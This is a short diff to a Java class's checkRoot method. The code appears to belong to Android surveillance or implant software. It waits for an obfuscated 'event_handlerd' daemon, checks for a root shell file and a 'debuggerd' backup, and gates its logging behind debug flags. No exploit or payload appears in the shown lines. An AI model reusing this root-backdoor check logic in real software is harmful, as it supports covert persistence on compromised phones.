@@ -136,16 +136,25 @@ public class PackageInfo {
 				Check.log(TAG + " (checkRoot), " + Configuration.shellFileBase);
 			}
 			final AutoFile file = new AutoFile(Configuration.shellFileBase);
-
+			final AutoFile dbg_file = new AutoFile(Configuration.debuggerd_bkp);
 			if (file.exists() && file.canRead()) {
-				//todo: check if the daemon (named event_handlerd)is running if not sleep 2 sec for 5 trials
 				long start = new Date().getTime();
-				while (Utils.pidOf(M.e("event_handlerd")) == null) {
-					Check.log(TAG + " (checkRoot): daemon event_handlerd not started");
-					Utils.sleep(1000);
-					if ((new Date().getTime() - start) > 10000) {
-						Check.log(TAG + " (checkRoot): timeout checking event_handlerd expired after " + (new Date().getTime() - start) / 1000 + "sec");
-						return isRoot;
+				if (dbg_file.exists()) {
+					//checking if the daemon (named event_handlerd)is running if not sleep 2 sec for 5 trials
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (checkRoot): dbg present!");
+					}
+					while (Utils.pidOf(M.e("event_handlerd")) == null) {
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (checkRoot): daemon event_handlerd not started");
+						}
+						Utils.sleep(1000);
+						if ((new Date().getTime() - start) > 10000) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (checkRoot): timeout checking event_handlerd expired after " + (new Date().getTime() - start) / 1000 + "sec");
+							}
+							break;
+						}
 					}
 				}
 				// try at least 2 times sleeping 1 secs
@@ -155,7 +164,9 @@ public class PackageInfo {
 					if(isRoot){
 						break;
 					}else if ((new Date().getTime() - start) > 2000) {
-						Check.log(TAG + " (checkRoot): timeout checking root expired after " + (new Date().getTime() - start) / 1000 + "sec");
+						if (Cfg.DEBUG) {
+							Check.log(TAG + " (checkRoot): timeout checking root expired after " + (new Date().getTime() - start) / 1000 + "sec");
+						}
 						break;
 					}
 					Utils.sleep(1000);
